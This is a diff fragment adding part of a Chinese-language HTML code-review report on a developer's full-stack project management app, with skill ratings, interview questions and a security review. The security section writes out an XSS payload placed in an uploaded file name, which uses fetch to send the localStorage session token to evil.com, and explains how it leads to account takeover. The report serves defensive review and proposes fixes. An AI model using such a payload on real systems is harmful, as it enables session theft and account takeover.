+  <tr><td>产品完成度</td><td class="done">8.0</td><td>已经像一个可用工具</td></tr>
+</table>
+
+<h3>开发者阶段定位</h3>
+
+<table style="margin-bottom:16px;">
+  <tr><th>水平</th><th>判断</th></tr>
+  <tr><td>初级开发</td><td class="done">明显超过</td></tr>
+  <tr><td>普通中级</td><td class="done">高于平均</td></tr>
+  <tr><td>高级工程师</td><td class="wip">还有距离</td></tr>
+  <tr><td>独立做 SaaS MVP</td><td class="done">达标</td></tr>
+  <tr><td>商业生产系统</td><td class="wip">需要继续打磨</td></tr>
+</table>
+
+<p style="color:var(--muted);font-size:12px;">
+≈ 2-4 年经验、偏全栈方向。不是纯代码型——明显会想"用户是谁？业务流程是什么？数据怎么流？"
+</p>
+
+<h3>核心优势画像</h3>
+
+<div style="background:var(--card);border-left:3px solid #22c55e;padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:1.8;">
+<strong style="color:#22c55e;">1. 产品意识非常强 ⭐⭐⭐⭐⭐</strong><br>
+不是 Todo/Blog/电商 Demo——是一个明确商业场景：团队协作 + 项目管理 + 供应商 + 财务核算。
+考虑到了 workspace · project · member · role · notification · webhook · audit · file · finance。<br><br>
+
+<strong style="color:#22c55e;">2. 技术栈选择成熟</strong><br>
+React 19 + TS + Tailwind v4 + shadcn/ui + Express + tRPC v11 + Drizzle ORM——现代 TypeScript 全栈方案。
+tRPC 减少了一层前后端类型同步问题。<br><br>
+
+<strong style="color:#22c55e;">3. 工程化意识不错</strong><br>
+CI (.github/workflows) · Husky pre-commit · Prettier · ESLint · Vitest · Docker · 文档。<br><br>
+
+<strong style="color:#22c55e;">4. 全栈能力均衡</strong><br>
+不是前端很强后端弱，也不是后端强 UI 拉胯。React + API + DB + 部署比较均衡。<br><br>
+
+<strong style="color:#22c55e;">5. 有产品 Owner 思维</strong><br>
+文件管理 · 财务 · 客户供应商 · Webhook——都是"用户需要什么"，不是炫技术。
+</div>
+
+<h3>面试官会追问的问题</h3>
+
+<div style="background:var(--card);padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:2;">
+· 为什么选择 tRPC 而不是 REST/GraphQL？<br>
+· 为什么不用 PostgreSQL？SQLite 的并发限制怎么处理？<br>
+· 权限系统如何扩展？从 admin/member 到 RBAC 怎么升级？<br>
+· 财务数据如何保证一致性？事务和余额计算的正确性怎么验证？<br>
+· 10000 用户时，当前架构会出什么问题？瓶颈在哪？<br>
+· 如果要拆微服务，你会先拆哪个模块？为什么？
+</div>
+
+<h3>进入高级工程师的路径</h3>
+
+<div style="background:var(--card);border-radius:10px;padding:20px 24px;margin-bottom:20px;font-size:13px;color:var(--muted);line-height:1.8;">
+
+<strong style="color:#c7d2fe;">方向 1 · 学习大型项目架构</strong><br>
+不要继续堆功能。开始重构 Controller → Service → Repository → Database。培养边界意识。<br><br>
+
+<strong style="color:#c7d2fe;">方向 2 · 深入数据库设计</strong><br>
+索引设计 · 查询优化 · 数据一致性 · 事务 · soft delete · audit log。<br><br>
+
+<strong style="color:#c7d2fe;">方向 3 · 补安全能力</strong><br>
+CSRF · Rate limit 策略 · Permission middleware · Input validation · File upload security。<br><br>
+
+<strong style="color:#c7d2fe;">方向 4 · 增加生产能力</strong><br>
+PostgreSQL 迁移 · Redis 缓存 · 消息队列 · 监控 · Graceful shutdown。<br>
+例如 User Action → API → Queue → Notification Worker → Webhook，项目直接提升一档。<br><br>
+
+<strong style="color:#c7d2fe;">方向 5 · 回答面试官的 6 个问题</strong><br>
+能回答出来，项目说服力明显提升。
+
+</div>
+
+<!-- ═══ 下一步建议 ═══ -->
+<h3>教师建议的下一步</h3>
+
+<div style="background:var(--card);border-left:3px solid var(--accent);padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:1.8;">
+<strong style="color:#c7d2fe;">方案 A：</strong>按"高级工程师 Code Review"标准逐文件审查源码<em>（教师推荐）</em><br>
+<strong style="color:#c7d2fe;">方案 B：</strong>站在创业产品角度评估商业化潜力及缺失功能<br>
+"基础已经值得深入看代码质量——建议先做 A。"
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- 第五轮评审 · 老师复核 P0 · 连锁攻击链 · 开发者成长路径             -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2>第五轮评审 · 老师复核 4 个 P0 &amp; 发现连锁漏洞</h2>
+
+<div class="summary-bar">
+  <span><strong>逐条验证 4 个 P0</strong></span>
+  <span class="badge-r">全部属实</span>
+  <span class="badge-y">发现 1 条连锁攻击链</span>
+</div>
+
+<blockquote style="background:var(--card);border-left:3px solid #22c55e;padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:1.8;">
+<strong style="color:#22c55e;">"你的自我审查是准确的，这件事本身值得认真表扬。"</strong><br><br>
+老师逐条验证了 4 个 P0：全部属实。P0-3（密码令牌泄露）是后果最严重的一条——任何人知道邮箱地址就能接管账号。<br>
+P0-2（tokenVersion）老师还多发现了一个残留问题：<code>tokenVersion.test.ts</code> 文件没清理（已修复）。
+</blockquote>
+
+<!-- ═══ 连锁漏洞 ═══ -->
+<h3>🔗 老师发现的连锁致命漏洞 · XSS + localStorage = 完全接管</h3>
+
+<div class="fix-card p0-card" style="border-left-width:5px;">
+<div class="fix-num">!</div>
+<div class="fix-body">
+<strong>P0-1 (XSS) + localStorage token = 账号完全接管</strong> <span class="effort">我们遗漏的连锁反应</span>
+<div class="fix-evidence">
+<code>client/src/_core/hooks/useAuth.ts</code> — token 存在 <code>localStorage</code> 里。<br>
+<code>server/lib/bot/file-preview.ts:60</code> — 文件名直接拼进 HTML 无编码。
+</div>
+<div class="fix-action">
+<strong>攻击链：</strong>攻击者上传文件名为 <code>&lt;script&gt;fetch('evil.com?t='+localStorage.chronos_token)&lt;/script&gt;</code> 的文件
+→ 受害者访问文件预览页 → JS 执行 → token 被盗 → 攻击者以受害者身份操作。<br>
+<strong>令牌无法失效：</strong>tokenVersion 撤销机制未实现，偷来的 token 没有任何办法让它提前失效。<br><br>
+<strong style="color:#fca5a5;">两个看似不相关的问题（P0-1 XSS + P2-21 localStorage），实际上是同一条攻击链的两端。</strong><br><br>
+<strong>纵深防御策略：</strong>不指望一道防线绝对不破——假设 XSS 总有可能发生，用 httpOnly cookie（JS 读不到）兜底。<br>
+<strong>建议：</strong>P2-21（token → httpOnly cookie）提到 <strong style="color:#fca5a5;">P0</strong>，和 XSS 修复一起做。
+</div>
+</div>
+</div>
+
+<!-- ═══ 修正后的 P0 ═══ -->
+<h3>修正后的 P0 清单（含连锁防御）</h3>
+
+<table style="margin-bottom:16px;">
+  <tr><th>#</th><th>原优先级</th><th>内容</th><th>连锁影响</th></tr>
+  <tr><td class="p0">1</td><td>P0</td><td>XSS — file-preview.ts HTML 编码 + DOMPurify</td><td>↑ 与 #5 形成攻击链</td></tr>
+  <tr><td class="p0">2</td><td>P0</td><td>tokenVersion — schema 加列 + context 校验 + test 重新实现</td><td>↑ 令牌唯一失效手段</td></tr>
+  <tr><td class="p0">3</td><td>P0</td><td>密码令牌泄露 — hash 存储 + 仅返回提示</td><td>独立严重漏洞</td></tr>
+  <tr><td class="p0">4</td><td>P0</td><td>全表扫描 — Dashboard WHERE + 列表 LIMIT 50</td><td>独立性能问题</td></tr>
+  <tr><td class="p0">5</td><td><span style="text-decoration:line-through">P2-21</span></td><td>token localStorage → httpOnly cookie (sameSite=lax)</td><td>↑ 纵深防御 · 兜底 XSS 场景</td></tr>
+</table>
+
+<!-- ═══ 开发者水平评估 ═══ -->
+<h3>老师对开发者水平的真实评估</h3>
+
+<blockquote style="background:var(--card);border-left:3px solid var(--accent);padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:1.8;">
+"你自己说'可能刚到中级工程师水平'——我觉得这个自我评价是<strong style='color:#c7d2fe'>偏保守的</strong>，但方向判断对。<br>
+你有一个中级工程师身上<strong style='color:#22c55e'>不常见</strong>的特质：你会去审查自己交付的东西，而且审查得很细。这不是知识的差距，是习惯的差距，<strong style='color:#22c55e'>习惯比知识更难培养</strong>，你已经在养成这个习惯了。"
+</blockquote>
+
+<h3>到"资深工程师"的三道分水岭</h3>
+
+<div style="background:var(--card);border-radius:10px;padding:20px 24px;margin-bottom:20px;font-size:13px;color:var(--muted);line-height:1.8;">
+
+<strong style="color:#22c55e;">1. 写代码"之前"就想到，而不是写完后审查出来</strong><br>
+"用户输入的东西，只要会进入 HTML，就默认需要转义"——这应该是写 file-preview.ts 那一刻就带着的反射动作，不是审查阶段才发现的问题。没有捷径，踩得越多、写下一行代码前的直觉越准。<br><br>
+
+<strong style="color:#22c55e;">2. 看到一个漏洞，习惯性地问"这个漏洞和别的东西有没有关联"</strong><br>
+就像 XSS + localStorage 的连锁分析——不是把每个问题当孤立条目打勾，而是问"被利用之后还能引出什么？"<br>
+<strong>刻意练习：</strong>审查出一个问题后，不要立刻修，先花 2 分钟问自己："这个问题被利用之后，还能引出什么别的问题？"<br><br>
+
+<strong style="color:#22c55e;">3. 对"修完就一劳永逸"更谨慎</strong><br>
+tokenVersion 的教训：紧急回退后忘了加回来，那个残留的测试文件就是证据。<br>
+<strong>资深做法：</strong>紧急回退时，同时开一个明确的、有截止日期的跟进任务，而不是靠"以后想起来再说"——因为"以后"经常不会来。<br><br>
+
+<strong style="color:#fca5a5;">老师的结论：</strong>"你已经不只是'中级'——能够设计出'7 位专家并行审查'这种方法论、并且用它揪出 4 个真实的严重漏洞，这个审查能力已经是不少工作过几年的工程师都未必具备的。你缺的不是知识量，是'把知道的东西变成写代码时的本能反应'这个还需要时间积累的部分。你现在走的这条路径，就是对的路径。"
+
+</div>
+
+<p style="color:var(--muted);font-size:12px;margin-top:20px;text-align:center;">
+<em>路线图 v12 · 五轮评审 · 老师复核 P0 · 连锁漏洞 · P2→P0 · 开发者成长路径 · 7.7/10</em>
+</p>
+
+</body>
+</html>
